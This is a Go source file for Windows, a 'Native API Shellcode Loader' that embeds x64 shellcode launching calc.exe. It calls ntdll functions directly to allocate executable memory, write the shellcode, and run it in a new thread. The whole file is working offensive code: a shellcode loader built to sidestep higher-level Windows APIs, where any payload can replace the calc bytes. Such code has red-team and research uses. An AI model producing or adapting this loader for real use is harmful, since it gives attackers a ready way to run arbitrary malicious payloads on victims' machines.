//go:build windows
// +build windows

package main

import (
	"fmt"
	"golang.org/x/sys/windows"
	"log"
	"syscall"
	"unsafe"
)

// Shellcode to launch calc.exe (x64)
var calcShellcode = []byte{
	0x50, 0x51, 0x52, 0x53, 0x56, 0x57, 0x55, 0x6A, 0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63,
	0x54, 0x59, 0x48, 0x83, 0xEC, 0x28, 0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48,
	0x8B, 0x76, 0x10, 0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C,
	0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B, 0x54, 0x1F, 0x24,
	0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81, 0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45,
	0x75, 0xEF, 0x8B, 0x74, 0x1F, 0x1C, 0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7,
	0x99, 0xFF, 0xD7, 0x48, 0x83, 0xC4, 0x30, 0x5D, 0x5F, 0x5E, 0x5B, 0x5A, 0x59, 0x58, 0xC3,
}

// Define STATUS_SUCCESS for NTSTATUS checks
const STATUS_SUCCESS uintptr = 0

func main() {
	fmt.Println("[+] Native API Shellcode Loader")

	// Target Native API functions we need for shellcode injection
	targetFunctions := []string{
		"NtAllocateVirtualMemory",
		"NtWriteVirtualMemory",
		"NtCreateThreadEx",
		"NtWaitForSingleObject",
		"NtFreeVirtualMemory",
		"NtClose",
	}

	fmt.Println("[*] Getting handle to ntdll.dll...")
	// Using LoadLibrary for simplicity, GetModuleHandle can also be used
	ntdllHandle, err := windows.LoadLibrary("ntdll.dll")
	if err != nil {
		log.Fatalf("[-] Failed to load ntdll.dll: %v", err)
	}

	// For long-running applications, ensure FreeLibrary is called.
	// defer windows.FreeLibrary(ntdllHandle) // Deferred if main function could return early before log.Fatal
	fmt.Printf("[+] Got ntdll.dll handle: 0x%X\n", ntdllHandle)

	fmt.Println("[*] Finding function addresses...")
	funcAddrs := make(map[string]uintptr)
	allFound := true
	for _, funcName := range targetFunctions {
		procAddr, errGetProc := windows.GetProcAddress(ntdllHandle, funcName)
		if errGetProc != nil {
			log.Printf("[!] Warning: GetProcAddress failed for '%s': %v", funcName, errGetProc)
			funcAddrs[funcName] = 0
			allFound = false
		} else if procAddr == 0 {
			log.Printf("[!] Warning: GetProcAddress returned NULL for '%s'.", funcName)
			funcAddrs[funcName] = 0
			allFound = false
		} else {
			fmt.Printf("  [+] Found '%s' at address: 0x%X\n", funcName, procAddr)
			funcAddrs[funcName] = procAddr
		}
	}

	if !allFound {
		windows.FreeLibrary(ntdllHandle)
		log.Fatalf("[-] Not all required NTAPI function addresses were found. Exiting.")
	}
	fmt.Println("[+] All required function addresses found.")

	// --- 1. Allocate Memory using NtAllocateVirtualMemory ---
	fmt.Println("[*] Allocating memory for shellcode...")
	var baseAddress uintptr // Will receive the base address of the allocated memory
	size := uintptr(len(calcShellcode))

	// NtAllocateVirtualMemory(ProcessHandle, &BaseAddress, ZeroBits, &RegionSize, AllocationType, Protect)
	// ProcessHandle: windows.CurrentProcess() which is -1 (pseudo handle for current process)
	// BaseAddress: Pointer to a PVOID, so unsafe.Pointer(&baseAddress)
	// ZeroBits: 0
	// RegionSize: Pointer to a SIZE_T, so unsafe.Pointer(&size)
	// AllocationType: MEM_COMMIT | MEM_RESERVE
	// Protect: PAGE_EXECUTE_READWRITE
	ntStatus, _, sysCallErr := syscall.SyscallN(
		funcAddrs["NtAllocateVirtualMemory"],
		uintptr(windows.CurrentProcess()),      // ProcessHandle
		uintptr(unsafe.Pointer(&baseAddress)),  // *BaseAddress
		0,                                      // ZeroBits
		uintptr(unsafe.Pointer(&size)),         // *RegionSize
		windows.MEM_COMMIT|windows.MEM_RESERVE, // AllocationType
		windows.PAGE_EXECUTE_READWRITE,         // Protect
	)

	if ntStatus != STATUS_SUCCESS {
		windows.FreeLibrary(ntdllHandle)
		log.Fatalf("[-] NtAllocateVirtualMemory failed with NTSTATUS: 0x%X. Syscall error: %v", ntStatus, sysCallErr)
	}
	if baseAddress == 0 {
		windows.FreeLibrary(ntdllHandle)
		log.Fatalf("[-] NtAllocateVirtualMemory succeeded but returned a NULL base address.")
	}
	fmt.Printf("[+] Memory allocated at: 0x%X, Size: %d bytes\n", baseAddress, size)

	// --- 2. Write Shellcode using NtWriteVirtualMemory ---
	fmt.Println("[*] Writing shellcode to allocated memory...")
	var numberOfBytesWritten uintptr

	// NtWriteVirtualMemory(ProcessHandle, BaseAddress, Buffer, NumberOfBytesToWrite, *NumberOfBytesWritten)
	// Buffer: Pointer to the shellcode data
	// NumberOfBytesWritten: Pointer to SIZE_T, can be 0 (nil) if not needed to check.
	ntStatus, _, sysCallErr = syscall.SyscallN(
		funcAddrs["NtWriteVirtualMemory"],
		uintptr(windows.CurrentProcess()),          // ProcessHandle
		baseAddress,                                // BaseAddress
		uintptr(unsafe.Pointer(&calcShellcode[0])), // Buffer
		size, // NumberOfBytesToWrite
		uintptr(unsafe.Pointer(&numberOfBytesWritten)), // *NumberOfBytesWritten (or uintptr(0) if not checking)
	)

	if ntStatus != STATUS_SUCCESS {
		// Attempt to free allocated memory before exiting if write fails
		var freeSize uintptr = 0 // For MEM_RELEASE, size must be 0
		// Note: NtFreeVirtualMemory expects PVOID *BaseAddress for the base address parameter
		syscall.SyscallN(
			funcAddrs["NtFreeVirtualMemory"],
			uintptr(windows.CurrentProcess()),
			uintptr(unsafe.Pointer(&baseAddress)), // Pass address of baseAddress
			uintptr(unsafe.Pointer(&freeSize)),    // Pass address of sizeForRelease
			windows.MEM_RELEASE,
		)
		windows.FreeLibrary(ntdllHandle)
		log.Fatalf("[-] NtWriteVirtualMemory failed with NTSTATUS: 0x%X. Syscall error: %v", ntStatus, sysCallErr)
	}
	fmt.Printf("[+] Shellcode (%d bytes) written to memory. Bytes written: %d\n", size, numberOfBytesWritten)

	// --- 3. Create Thread using NtCreateThreadEx ---
	fmt.Println("[*] Creating a new thread to execute shellcode...")
	var threadHandle windows.Handle

	// THREAD_ALL_ACCESS (0x1FFFFF) might not be defined as windows.THREAD_ALL_ACCESS
	// in older golang.org/x/sys/windows packages.
	// It's composed of: STANDARD_RIGHTS_REQUIRED (0x000F0000) | SYNCHRONIZE (0x00100000) | 0xFFFF (specific thread rights)
	// It's recommended to update your package: go get -u golang.org/x/sys/windows
	const desiredThreadAccess uintptr = 0x1FFFFF // Using the direct value for compatibility

	// NtCreateThreadEx(&ThreadHandle, DesiredAccess, ObjectAttributes, ProcessHandle, StartAddress, Parameter, CreateFlags, ZeroBits, StackSize, MaximumStackSize, AttributeList)
	// All optional/complex parameters set to 0/nil for simplicity.
	ntStatus, _, sysCallErr = syscall.SyscallN(
		funcAddrs["NtCreateThreadEx"],
		uintptr(unsafe.Pointer(&threadHandle)), // *ThreadHandle
		desiredThreadAccess,                    // DesiredAccess
		0,                                      // ObjectAttributes (NULL)
		uintptr(windows.CurrentProcess()),      // ProcessHandle
		baseAddress,                            // StartAddress (our shellcode)
		0,                                      // Parameter (NULL)
		0,                                      // CreateFlags (0 = run immediately)
		0,                                      // ZeroBits
		0,                                      // StackSize (0 = default)
		0,                                      // MaximumStackSize (0 = default)
		0,                                      // AttributeList (NULL)
	)

	if ntStatus != STATUS_SUCCESS {
		// Attempt to free allocated memory before exiting if thread creation fails
		var freeSize uintptr = 0
		syscall.SyscallN(
			funcAddrs["NtFreeVirtualMemory"],
			uintptr(windows.CurrentProcess()),
			uintptr(unsafe.Pointer(&baseAddress)),
			uintptr(unsafe.Pointer(&freeSize)),
			windows.MEM_RELEASE,
		)
		windows.FreeLibrary(ntdllHandle)
		log.Fatalf("[-] NtCreateThreadEx failed with NTSTATUS: 0x%X. Syscall error: %v", ntStatus, sysCallErr)
	}
	if threadHandle == 0 {
		// As above, clean up memory if thread handle is null
		var freeSize uintptr = 0
		syscall.SyscallN(
			funcAddrs["NtFreeVirtualMemory"],
			uintptr(windows.CurrentProcess()),
			uintptr(unsafe.Pointer(&baseAddress)),
			uintptr(unsafe.Pointer(&freeSize)),
			windows.MEM_RELEASE,
		)
		windows.FreeLibrary(ntdllHandle)
		log.Fatalf("[-] NtCreateThreadEx succeeded but returned a NULL thread handle.")
	}
	fmt.Printf("[+] Thread created successfully with Handle: 0x%X. Shellcode should be executing (calc.exe).\n", threadHandle)

	// --- 4. Wait for the Thread to Complete using NtWaitForSingleObject ---
	fmt.Println("[*] Waiting for the thread to complete (calc.exe to be closed)...")
	// NtWaitForSingleObject(Handle, Alertable, Timeout)
	// Alertable: FALSE (0)
	// Timeout: NULL (or a pointer to a large value for effectively infinite, or 0 for no wait if already signaled)
	// For infinite wait, pass a nil pointer, which is uintptr(0) for syscall.
	// However, syscall.INFINITE (or windows.INFINITE) is often defined as 0xFFFFFFFF
	// A NULL pointer for timeout means infinite wait.
	ntStatus, _, sysCallErr = syscall.SyscallN(
		funcAddrs["NtWaitForSingleObject"],
		uintptr(threadHandle), // Handle
		0,                     // Alertable (FALSE)
		uintptr(0),            // Timeout (NULL pointer for infinite wait)
	)

	if ntStatus != STATUS_SUCCESS {
		// Log error but proceed to cleanup
		log.Printf("[!] NtWaitForSingleObject failed with NTSTATUS: 0x%X. Syscall error: %v. Proceeding with cleanup.\n", ntStatus, sysCallErr)
	} else {
		fmt.Println("[+] Thread completed.")
	}

	// --- 5. Close the Thread Handle using NtClose ---
	// This should be done regardless of NtWaitForSingleObject outcome, if threadHandle is valid.
	fmt.Println("[*] Closing thread handle...")
	ntStatusClose, _, sysCallErrClose := syscall.SyscallN(
		funcAddrs["NtClose"],
		uintptr(threadHandle), // Handle
	)
	if ntStatusClose != STATUS_SUCCESS {
		log.Printf("[!] NtClose failed for thread handle 0x%X with NTSTATUS: 0x%X. Syscall error: %v\n", threadHandle, ntStatusClose, sysCallErrClose)
	} else {
		fmt.Printf("[+] Thread handle 0x%X closed.\n", threadHandle)
	}

	// --- 6. Free Allocated Memory using NtFreeVirtualMemory ---
	// This should be done regardless of prior errors, if baseAddress is valid.
	fmt.Println("[*] Freeing allocated memory...")
	var sizeForRelease uintptr = 0 // When using MEM_RELEASE, RegionSize must be 0.
	// The BaseAddress parameter must be the same address returned by NtAllocateVirtualMemory.

	// NtFreeVirtualMemory(ProcessHandle, &BaseAddress, &RegionSize, FreeType)
	// BaseAddress for NtFreeVirtualMemory is PVOID*, so it's a pointer to the variable holding the base address.
	// RegionSize for NtFreeVirtualMemory is PSIZE_T*, also a pointer. When FreeType is MEM_RELEASE, this value must be 0.
	ntStatus, _, sysCallErr = syscall.SyscallN(
		funcAddrs["NtFreeVirtualMemory"],
		uintptr(windows.CurrentProcess()),        // ProcessHandle
		uintptr(unsafe.Pointer(&baseAddress)),    // *BaseAddress (pointer to the variable holding the address)
		uintptr(unsafe.Pointer(&sizeForRelease)), // *RegionSize (pointer to the size, which is 0 for MEM_RELEASE)
		windows.MEM_RELEASE,                      // FreeType
	)

	if ntStatus != STATUS_SUCCESS {
		// Even if free fails, we've done our best. Log and exit.
		windows.FreeLibrary(ntdllHandle)
		log.Fatalf("[-] NtFreeVirtualMemory failed with NTSTATUS: 0x%X. Syscall error: %v", ntStatus, sysCallErr)
	}
	// The variable baseAddress still holds the address value, but the memory it pointed to is now invalid.
	fmt.Printf("[+] Memory (previously at 0x%X) freed successfully.\n", baseAddress)

	windows.FreeLibrary(ntdllHandle) // Final cleanup of ntdll handle
	fmt.Println("[+] Shellcode injection process complete.")
}
